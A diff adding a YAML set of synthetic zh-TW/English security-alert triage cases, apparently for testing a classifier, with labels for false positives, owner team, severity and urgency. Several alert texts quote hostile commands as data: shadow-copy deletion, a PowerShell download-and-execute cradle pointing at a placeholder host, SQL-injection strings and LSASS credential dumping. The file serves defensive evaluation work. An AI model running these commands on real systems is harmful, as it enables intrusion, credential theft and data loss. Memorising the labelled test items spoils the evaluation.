@@ -1,0 +1,365 @@
+# Synthetic incident-triage families, v1.
+#
+# Every label here is true because LABELBOOK.md defines it for the scenario
+# as written: label_status by_construction, Tier E. These cases test the
+# engineering contract and the coverage of the label space (routing
+# counter-examples, the severity grid, the approval rule, zh-TW/en pairs).
+# They are not human gold and never stand in for it.
+#
+# The templates are new: none is taken from jef_train/corpus/soar_zh.py, the
+# training corpus, and the lock checks near-duplicates against it.
+#
+# Slots: {host} {host2} {ip} {time} {n} {user} {ticket}. One fill per variant
+# is shared by its zh-TW and en text so the pair says the same thing.
+#
+# Labels: fp / ev / urgent are true, false or unknown; owner and severity are
+# lists of acceptable answers (first = primary) or unknown.
+
+version: 1
+seed: 20261020
+
+families:
+  # ------------------------------------------------------------------ EDR
+  - family: edr-vss-ransomware
+    domain: edr
+    variants:
+      - kind: base
+        zh: "EDR 於 {time} 偵測 {host} 上由 {user} 啟動 vssadmin delete shadows /all，隨後 {n} 分鐘內 2,800 個檔案改為 .crypt 副檔名，共用資料夾出現 HOW-TO-DECRYPT.txt。"
+        en: "At {time} EDR saw {user} run vssadmin delete shadows /all on {host}; within {n} minutes 2,800 files were renamed to .crypt and HOW-TO-DECRYPT.txt appeared on the shares."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [soc, infra], severity: [危急], urgent: true}
+      - kind: hard_negative
+        zh: "EDR 於 {time} 偵測 {host} 上由備份服務帳號 svc-backup 執行 vssadmin delete shadows /for=D: /oldest，屬每週快照輪替作業（變更單 {ticket}，維護窗 01:00 至 03:00），未見檔案改名。"
+        en: "At {time} EDR saw the backup service account svc-backup run vssadmin delete shadows /for=D: /oldest on {host}, the weekly snapshot rotation (change {ticket}, window 01:00-03:00); no file renames followed."
+        event: benign
+        alert: false_positive
+        labels: {fp: true, ev: true, owner: [infra], severity: [資訊], urgent: false}
+
+  - family: edr-missing-parent
+    domain: edr
+    variants:
+      - kind: base
+        zh: "EDR 告警：{host} 於 {time} 執行含 -EncodedCommand 參數的 powershell.exe。告警未包含父程序、執行帳號或指令內容。"
+        en: "EDR alert: powershell.exe with -EncodedCommand ran on {host} at {time}. The alert carries no parent process, account or command content."
+        event: unknown
+        alert: unknown
+        labels: {fp: unknown, ev: false, owner: [soc], severity: unknown, urgent: unknown}
+        required_context: [parent_process, account, decoded_command]
+
+  - family: edr-admin-script
+    domain: edr
+    variants:
+      - kind: base
+        zh: "EDR 於 {time} 偵測 {host} 上 winword.exe 啟動 powershell.exe，執行 IEX (New-Object Net.WebClient).DownloadString('http://{ip}/a.ps1')，並在 Run 機碼建立開機啟動項。"
+        en: "At {time} EDR saw winword.exe on {host} spawn powershell.exe running IEX (New-Object Net.WebClient).DownloadString('http://{ip}/a.ps1') and add a Run-key autostart."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [soc], severity: [高, 危急], urgent: true}
+      - kind: hard_negative
+        zh: "EDR 於 {time} 偵測 {host} 上 CcmExec.exe 啟動 powershell.exe 執行已簽章的 Set-Baseline.ps1，為 SCCM 部署的組態基準作業（變更單 {ticket}），腳本雜湊與部署清單相符。"
+        en: "At {time} EDR saw CcmExec.exe on {host} start powershell.exe running the signed Set-Baseline.ps1, an SCCM configuration-baseline deployment (change {ticket}); the script hash matches the deployment manifest."
+        event: benign
+        alert: false_positive
+        labels: {fp: true, ev: true, owner: [infra], severity: [資訊], urgent: false}
+
+  - family: edr-installer
+    domain: edr
+    variants:
+      - kind: base
+        zh: "EDR 於 {time} 偵測 {user} 從下載資料夾執行未簽章的 setup_viewer.exe，該程式在 %APPDATA% 寫入 svchost32.exe 並建立排程工作，每 {n} 分鐘連線 {ip}。"
+        en: "At {time} EDR saw {user} run the unsigned setup_viewer.exe from Downloads; it wrote svchost32.exe to %APPDATA% and created a scheduled task that connects to {ip} every {n} minutes."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [soc], severity: [高], urgent: true}
+      - kind: hard_negative
+        zh: "EDR 於 {time} 偵測 {host} 上 msiexec.exe 安裝已簽章的 VPNClient-5.2.msi 並寫入服務，來源為軟體派送平台，派送單 {ticket} 已核准。"
+        en: "At {time} EDR saw msiexec.exe on {host} install the signed VPNClient-5.2.msi and register a service, pushed by the software distribution platform under approved request {ticket}."
+        event: benign
+        alert: false_positive
+        labels: {fp: true, ev: true, owner: [infra], severity: [資訊], urgent: false}
+
+  # ------------------------------------------------------------------ NDR
+  - family: ndr-beacon
+    domain: ndr
+    variants:
+      - kind: base
+        zh: "NDR 於 {time} 起觀察到 {host} 每 300 秒向 {ip}:8443 發出 1,024 bytes 的 TLS 連線，抖動低於 1 秒，持續 {n} 小時；目的網域註冊未滿一週。"
+        en: "Since {time} NDR has seen {host} open a 1,024-byte TLS connection to {ip}:8443 every 300 seconds, jitter under 1 second, for {n} hours; the destination domain is less than a week old."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [soc], severity: [高, 危急], urgent: true}
+      - kind: hard_negative
+        zh: "NDR 於 {time} 起觀察到 {host} 每 300 秒向監控服務 {ip}:443 發出固定大小的 TLS 連線；該目的地在核准的 SaaS 允許清單中，為監控代理程式的心跳。"
+        en: "Since {time} NDR has seen {host} send a fixed-size TLS connection to the monitoring service {ip}:443 every 300 seconds; the destination is on the approved SaaS allowlist and is the monitoring agent's heartbeat."
+        event: benign
+        alert: false_positive
+        labels: {fp: true, ev: true, owner: [soc], severity: [資訊], urgent: false}
+
+  - family: ndr-transfer-spike
+    domain: ndr
+    variants:
+      - kind: base
+        zh: "NDR 於 {time} 偵測 {host} 在 {n} 分鐘內向雲端儲存 {ip} 上傳 38 GB，該主機平日外送量低於 200 MB，目的地不在核准清單。"
+        en: "At {time} NDR saw {host} upload 38 GB to cloud storage at {ip} within {n} minutes; the host normally sends under 200 MB a day and the destination is not approved."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [soc], severity: [高, 危急], urgent: true}
+      - kind: hard_negative
+        zh: "NDR 於 {time} 偵測 {host} 向 CDN 來源站 {ip} 上傳 38 GB，為每月靜態資源同步排程（變更單 {ticket}，視窗 {time} 起 2 小時）。"
+        en: "At {time} NDR saw {host} upload 38 GB to the CDN origin {ip}, the monthly static-asset sync (change {ticket}, a two-hour window from {time})."
+        event: benign
+        alert: false_positive
+        labels: {fp: true, ev: true, owner: [infra], severity: [資訊], urgent: false}
+
+  - family: ndr-dns-tunnel
+    domain: ndr
+    variants:
+      - kind: base
+        zh: "DNS 日誌顯示 {host} 自 {time} 起查詢 {n} 千筆長度超過 60 字元、熵值極高的 TXT 子網域，皆指向同一個新註冊網域，回應內容為 base64 片段。"
+        en: "DNS logs show {host} has made {n} thousand TXT queries since {time} for high-entropy subdomains over 60 characters, all under one newly registered domain, with base64 fragments in the answers."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [soc], severity: [高], urgent: true}
+      - kind: hard_negative
+        zh: "DNS 日誌顯示郵件閘道 {host} 自 {time} 起大量查詢 _dmarc 與 selector._domainkey 的 TXT 紀錄，對應當日收信的寄件網域，屬 DMARC／DKIM 驗證流程。"
+        en: "DNS logs show the mail gateway {host} querying many _dmarc and selector._domainkey TXT records since {time}, matching the sender domains of the day's inbound mail: DMARC/DKIM verification."
+        event: benign
+        alert: false_positive
+        labels: {fp: true, ev: true, owner: [soc], severity: [資訊], urgent: false}
+
+  - family: ndr-scan
+    domain: ndr
+    variants:
+      - kind: base
+        zh: "IDS 於 {time} 偵測內部工作站 {host} 對 {n} 個網段進行 SMB 與 RDP 連接埠掃描；該主機不是登記的掃描器，使用者 {user} 不屬於資安團隊。"
+        en: "At {time} IDS saw workstation {host} sweep SMB and RDP ports across {n} subnets; it is not a registered scanner and its user {user} is not on the security team."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [soc], severity: [高], urgent: true}
+      - kind: hard_negative
+        zh: "IDS 於 {time} 偵測 {ip} 對 {n} 個網段進行連接埠掃描；{ip} 為登記的 Nessus 掃描器，本次掃描排程已核准（工單 {ticket}，視窗 {time} 起 3 小時）。"
+        en: "At {time} IDS saw {ip} port-scan {n} subnets; {ip} is the registered Nessus scanner and this run is approved (ticket {ticket}, a three-hour window from {time})."
+        event: benign
+        alert: false_positive
+        labels: {fp: true, ev: true, owner: [soc], severity: [資訊], urgent: false}
+      - kind: twin
+        of: hard_negative
+        zh: "IDS 於 {time} 偵測 {ip} 對 {n} 個網段進行連接埠掃描。告警未說明 {ip} 是否為核准的掃描器。"
+        en: "At {time} IDS saw {ip} port-scan {n} subnets. The alert does not say whether {ip} is an approved scanner."
+        event: unknown
+        alert: unknown
+        labels: {fp: unknown, ev: false, owner: [soc], severity: unknown, urgent: unknown}
+        required_context: [scanner_approval]
+
+  # ------------------------------------------------------------------ identity
+  - family: id-ssh-brute
+    domain: identity
+    variants:
+      - kind: base
+        zh: "{host} 的 sshd 記錄來自 {ip} 對 root 失敗登入 {n} 百次後，於 {time} 以密碼登入成功，隨即新增 authorized_keys。"
+        en: "sshd on {host} logged {n} hundred failed root logins from {ip}, then a password login succeeded at {time} and a key was added to authorized_keys."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [identity, soc], severity: [危急], urgent: true}
+      - kind: hard_negative
+        zh: "{host} 的 sshd 記錄來自 {ip} 對 root 失敗登入 {n} 百次，全部失敗；fail2ban 已於 {time} 封鎖該來源，無任何成功登入。"
+        en: "sshd on {host} logged {n} hundred failed root logins from {ip}, none successful; fail2ban blocked the source at {time}."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [identity, soc], severity: [低], urgent: false}
+
+  - family: id-jump-host
+    domain: identity
+    variants:
+      - kind: base
+        zh: "身分平台顯示 {user} 於 {time} 起 {n} 分鐘內從跳板機 {host} 以特權帳號登入 40 台伺服器，對應變更單 {ticket} 的修補作業。"
+        en: "The identity platform shows {user} logging in to 40 servers with a privileged account from jump host {host} within {n} minutes from {time}, matching the patching under change {ticket}."
+        event: benign
+        alert: false_positive
+        labels: {fp: true, ev: true, owner: [identity], severity: [資訊], urgent: false}
+      - kind: hard_negative
+        zh: "身分平台顯示 {user} 於 {time}（非上班時間）起 {n} 分鐘內從一般筆電 {host2} 以特權帳號登入 40 台伺服器，未對應任何變更單。"
+        en: "The identity platform shows {user} logging in to 40 servers with a privileged account from an ordinary laptop {host2} within {n} minutes from {time}, outside working hours, with no matching change."
+        event: unknown
+        alert: unknown
+        labels: {fp: unknown, ev: false, owner: [identity], severity: [高], urgent: unknown}
+        required_context: [change_ticket, user_confirmation]
+
+  - family: id-service-account
+    domain: identity
+    variants:
+      - kind: base
+        zh: "服務帳號 svc-report 於 {time} 起依排程以非互動方式登入 {n} 台資料庫主機執行日報作業，排程 {ticket} 已登記，來源為批次主機 {host}。"
+        en: "Service account svc-report logged in non-interactively to {n} database hosts from batch host {host} at {time} for the scheduled daily report, registered as {ticket}."
+        event: benign
+        alert: false_positive
+        labels: {fp: true, ev: true, owner: [identity], severity: [資訊], urgent: false}
+      - kind: hard_negative
+        zh: "服務帳號 svc-report 於 {time} 從使用者筆電 {host2} 以互動方式（RDP）登入資料庫主機 {host}，該帳號依政策不得互動登入。"
+        en: "Service account svc-report logged in interactively over RDP to database host {host} from user laptop {host2} at {time}; policy forbids interactive logins for it."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [identity, soc], severity: [高], urgent: true}
+
+  - family: id-mfa
+    domain: identity
+    variants:
+      - kind: base
+        zh: "{user} 於 {time} 前 {n} 分鐘收到 25 次 MFA 推播後核准一次，登入來源 {ip} 位於境外，隨即建立信箱轉寄規則。"
+        en: "{user} received 25 MFA pushes in the {n} minutes before {time}, approved one, and the session from {ip} abroad immediately created a mailbox forwarding rule."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [identity], severity: [高, 危急], urgent: true}
+      - kind: hard_negative
+        zh: "{user} 於 {time} 重新註冊 MFA 裝置，經服務台依工單 {ticket} 驗證身分後執行，登入來源為公司網路。"
+        en: "{user} re-enrolled an MFA device at {time}, performed by the service desk after identity verification under ticket {ticket}, from the corporate network."
+        event: benign
+        alert: false_positive
+        labels: {fp: true, ev: true, owner: [identity], severity: [資訊], urgent: false}
+
+  # ------------------------------------------------------------------ routing
+  - family: rt-appsec-sqli
+    domain: routing
+    variants:
+      - kind: base
+        zh: "WAF 於 {time} 記錄 {ip} 對 /api/v1/accounts 送出含 ' OR 1=1-- 與 SLEEP(5) 的請求共 {n} 百筆，其中 12 筆未被攔截且回應時間延長 5 秒。"
+        en: "At {time} the WAF logged {n} hundred requests from {ip} to /api/v1/accounts containing ' OR 1=1-- and SLEEP(5); 12 were not blocked and their responses were delayed by 5 seconds."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [appsec], severity: [高], urgent: true}
+      - kind: hard_negative
+        zh: "WAF 於 {time} 記錄 {ip} 對測試環境 staging-api 送出大量注入測試字串；{ip} 為應用安全團隊的 DAST 掃描器，掃描已排程（工單 {ticket}）。"
+        en: "At {time} the WAF logged many injection test strings from {ip} against the staging-api test environment; {ip} is the AppSec team's DAST scanner and the scan is scheduled (ticket {ticket})."
+        event: benign
+        alert: false_positive
+        labels: {fp: true, ev: true, owner: [appsec], severity: [資訊], urgent: false}
+
+  - family: rt-appsec-dependency
+    domain: routing
+    variants:
+      - kind: base
+        zh: "SCA 掃描發現服務 order-svc 使用的 jackson-databind 版本有反序列化漏洞（CVSS 8.1），影響 {n} 個映像檔；目前無利用跡象，服務僅對內開放。"
+        en: "SCA found a deserialization flaw (CVSS 8.1) in the jackson-databind version used by order-svc, in {n} images; there is no sign of exploitation and the service is internal only."
+        event: benign
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [appsec], severity: [中], urgent: false}
+
+  - family: rt-infra-cert
+    domain: routing
+    variants:
+      - kind: base
+        zh: "憑證監控：{host} 對外 API 的 TLS 憑證將於 7 天後到期，尚無續期排程。"
+        en: "Certificate monitoring: the TLS certificate of the public API on {host} expires in 7 days and no renewal is scheduled."
+        event: benign
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [infra], severity: [中], urgent: false}
+
+  - family: rt-infra-disk
+    domain: routing
+    variants:
+      - kind: base
+        zh: "監控於 {time} 告警：撮合資料庫 {host} 的資料磁碟使用率 97%，每小時成長 1%，預計 {n} 小時內寫滿。"
+        en: "At {time} monitoring alerted that the data disk of matching database {host} is 97% full and growing 1% an hour; it fills within {n} hours."
+        event: benign
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [infra], severity: [高], urgent: true}
+
+  - family: rt-fraud-ato
+    domain: routing
+    variants:
+      - kind: base
+        zh: "風控系統於 {time} 標記客戶帳戶：密碼重設、更換綁定手機、新裝置登入，{n} 分鐘後申請將全部餘額轉出至新約定帳戶，來源 {ip}。"
+        en: "At {time} risk control flagged a customer account: password reset, phone number changed, login from a new device, then {n} minutes later a request to move the whole balance to a newly added payee, from {ip}."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [fraud], severity: [危急], urgent: true}
+      - kind: hard_negative
+        zh: "風控系統於 {time} 標記客戶境外登入（{ip}）；客戶已於前日透過 App 登記出國行程，裝置與過去相同，無轉帳或下單。"
+        en: "At {time} risk control flagged a customer login from abroad ({ip}); the customer registered the trip in the app the day before, the device is the usual one, and there was no transfer or order."
+        event: benign
+        alert: false_positive
+        labels: {fp: true, ev: true, owner: [fraud], severity: [資訊], urgent: false}
+
+  - family: rt-fraud-structuring
+    domain: routing
+    variants:
+      - kind: base
+        zh: "AML 模組回報客戶於 {n} 日內以略低於申報門檻的金額現金存入 14 筆，資金隨即分散轉出至 6 個第三方帳戶。"
+        en: "The AML module reports a customer made 14 cash deposits just under the reporting threshold over {n} days, each quickly split out to 6 third-party accounts."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [fraud], severity: [中, 高], urgent: false}
+
+  - family: rt-trading-host-identity
+    domain: routing
+    note: Counter-example to fraud. Trading vocabulary, employee account, identity owns it.
+    variants:
+      - kind: base
+        zh: "交易系統主機 {host} 上，員工帳號 {user} 於 {time} 被加入本機 Administrators 群組，未經權限申請流程，操作來源為 {host2}。"
+        en: "On trading-system host {host}, employee account {user} was added to the local Administrators group at {time} outside the access-request process, from {host2}."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [identity], severity: [高], urgent: true}
+
+  - family: rt-trading-host-malware
+    domain: routing
+    note: Counter-example to fraud. Malware on a trading front end belongs to the SOC.
+    variants:
+      - kind: base
+        zh: "EDR 於 {time} 在下單前台伺服器 {host} 偵測到已知木馬 QakBot 的記憶體特徵，並發現其對 {ip} 的連線。"
+        en: "At {time} EDR found QakBot memory signatures on order front-end server {host} and connections from it to {ip}."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [soc], severity: [危急], urgent: true}
+
+  # ------------------------------------------------------------------ severity grid
+  - family: sev-blocked-download
+    domain: severity
+    variants:
+      - kind: base
+        zh: "Proxy 於 {time} 攔截 {user} 從 {ip} 下載已知惡意檔案 invoice.js，檔案未落地、未執行。"
+        en: "At {time} the proxy blocked {user} downloading the known-malicious invoice.js from {ip}; the file never reached disk or ran."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [soc], severity: [低], urgent: false}
+
+  - family: sev-recovered
+    domain: severity
+    variants:
+      - kind: base
+        zh: "{host} 於昨日遭勒索軟體加密 {n} 個檔案，已隔離主機並自備份完成還原，鑑識未發現橫向移動；本告警為事後彙整。"
+        en: "Ransomware encrypted {n} files on {host} yesterday; the host was isolated and restored from backup, and forensics found no lateral movement. This alert is the after-action summary."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [soc], severity: [中], urgent: false}
+
+  - family: sev-high-impact-low-likelihood
+    domain: severity
+    variants:
+      - kind: base
+        zh: "網域管理員帳號於 {time} 自內部位址 {host} 出現 1 次登入失敗，之後無其他嘗試。"
+        en: "A domain admin account had one failed login from internal host {host} at {time}, with no further attempts."
+        event: unknown
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [identity], severity: [低, 中], urgent: false}
+
+  - family: sev-low-impact-high-frequency
+    domain: severity
+    variants:
+      - kind: base
+        zh: "郵件閘道於 {time} 前一小時隔離 {n} 百封相同主旨的垃圾郵件，無使用者點擊，無附件放行。"
+        en: "In the hour before {time} the mail gateway quarantined {n} hundred spam messages with one subject; no user clicked and no attachment was released."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [soc], severity: [資訊, 低], urgent: false}
+
+  - family: sev-unknown-criticality
+    domain: severity
+    variants:
+      - kind: base
+        zh: "EDR 於 {time} 偵測 {host} 執行 mimikatz 特徵程式並讀取 LSASS 記憶體；資產清冊中查無此主機。"
+        en: "At {time} EDR saw a mimikatz-like binary read LSASS memory on {host}; the host is not in the asset inventory."
+        event: malicious
+        alert: true_positive
+        labels: {fp: false, ev: true, owner: [soc], severity: [高, 危急], urgent: true}
